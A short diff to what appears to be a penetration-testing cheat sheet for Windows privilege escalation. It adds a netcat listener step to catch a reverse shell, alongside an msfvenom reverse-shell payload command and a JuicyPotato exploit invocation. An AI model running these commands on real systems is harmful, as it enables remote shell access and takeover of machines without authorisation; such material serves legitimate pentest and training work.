@@ -176,6 +176,10 @@ Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=
 
 ### Execution
 
-Create the listener to cath the payload then run:
+Create the listener to cath the payload
+
+<code>nc -lnvp [PORT]</code>
+
+Run the exploit on the target host.
 
 <code>JuicyPotato.exe -l 1337 -p [DIR\TO\EXPLOIT] -t * -c {CLSID}</code>
